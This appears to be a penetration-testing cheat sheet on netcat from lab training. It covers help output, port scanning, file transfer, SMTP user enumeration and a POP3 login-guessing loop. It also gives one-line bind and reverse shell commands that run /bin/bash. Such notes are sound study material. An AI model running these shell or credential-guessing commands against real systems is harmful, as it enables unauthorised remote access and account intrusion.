---
Description: Netcat (nc & ncat) is a feature-packed networking utility which reads and writes data across networks from the command line
---

```bash
┌──(kali㉿kali)-[~]
└─$ nc -h
[v1.10-46]
connect to somewhere:   nc [-options] hostname port[s] [ports] ...
listen for inbound:     nc -l -p port [-options] [hostname] [port]
options:
        -c shell commands       as `-e'; use /bin/sh to exec [dangerous!!]
        -e filename             program to exec after connect [dangerous!!]
        -b                      allow broadcasts
        -g gateway              source-routing hop point[s], up to 8
        -G num                  source-routing pointer: 4, 8, 12, ...
        -h                      this cruft
        -i secs                 delay interval for lines sent, ports scanned
        -k                      set keepalive option on socket
        -l                      listen mode, for inbound connects
        -n                      numeric-only IP addresses, no DNS
        -o file                 hex dump of traffic
        -p port                 local port number
        -r                      randomize local and remote ports
        -q secs                 quit after EOF on stdin and delay of secs
        -s addr                 local source address
        -T tos                  set Type Of Service
        -t                      answer TELNET negotiation
        -u                      UDP mode
        -v                      verbose [use twice to be more verbose]
        -w secs                 timeout for connects and final net reads
        -C                      Send CRLF as line-ending
        -z                      zero-I/O mode [used for scanning]
port numbers can be individual or ranges: lo-hi [inclusive];
hyphens in port names must be backslash escaped (e.g. 'ftp\\-data').
```

## Shell

>[!warning]
>Latest version of netcat does not include the old `-e` flag

### Bind shell

*Who will connect, will get a Shell*
Server: `nc -lvp [port] -e /bin/bash`
Client: `nc [IP] [port]`

### Reverse shell

*When I connect to the server, I give a shell*
Server: `nc -lvp [port`
Client: `nc [IP] [port] -e /bin/bash`

## File transfer

### Pushing files

Server: `nc -lvp [port] > [destination file]`
Client: `nc [IP] [port] < [file to be pushed]`

### Downloading files

Server: `nc -lvp [port] < [file to download]`
Client: `nc [IP] [port] > [downloaded file]`

## Client mode

```bash
kali@kali:~$ nc -nv 10.11.0.22 110
(UNKNOWN) [10.11.0.22] 110 (pop3) open
+OK POP3 server lab ready <00004.1546827@lab>
USER offsec
+OK offsec welcome here
PASS offsec
-ERR unable to lock mailbox
quit
+OK POP3 server lab signing off.
kali@kali:~$
```

## Port scanning

### TCP scan

`-w` = timeout
`-z` = no data

```bash
kali@kali:~$ nc -nvv -w 1 -z 10.11.1.220 3388-3390
(UNKNOWN) [10.11.1.220] 3390 (?) : Connection refused
(UNKNOWN) [10.11.1.220] 3389 (?) open
(UNKNOWN) [10.11.1.220] 3388 (?) : Connection refused
sent 0, rcvd 0
```

### UDP scan

`-u` = UDP

```bash
kali@kali:~$ nc -nv -u -z -w 1 10.11.1.115 160-162
(UNKNOWN) [10.11.1.115] 161 (snmp) open
```

## SMTP Enumeration

```bash
kali@kali:~$ nc -nv 10.11.1.217 25
(UNKNOWN) [10.11.1.217] 25 (smtp) open
220 hotline.localdomain ESMTP Postfix
VRFY root
252 2.0.0 root
VRFY idontexist
550 5.1.1 <idontexist>: Recipient address rejected: User unknown in local recipient
table
^C

kali@kali:~$ for user in marcus john mailadmin jenny ryuu joe45; do
    ( echo USER ${user}; sleep 2s; echo PASS abcd; sleep 2s; echo LIST; sleep 2s; echo quit) | nc -nvC 10.11.1.72 110;  done
```